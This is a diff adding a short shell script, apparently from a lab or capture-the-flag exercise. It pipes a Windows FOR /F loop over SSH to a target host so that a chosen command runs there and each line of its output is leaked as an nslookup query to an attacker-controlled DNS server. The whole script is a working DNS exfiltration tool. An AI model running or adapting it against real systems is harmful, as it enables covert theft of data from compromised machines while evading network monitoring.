@@ -1,0 +1,11 @@
+#!/bin/sh
+
+cmd=$1
+skip=$2
+dns="10.66.10.201"
+tgt="10.66.10.56"
+
+sendCmd="( FOR /F \"skip=${skip} \" %a IN ('${cmd}') DO ( nslookup SKIP.%a. $dns & nslookup END.${skip}. $dns & exit 0 ) )"
+
+echo $sendCmd | ssh m0noc@$tgt > /dev/null 2>&1
+echo
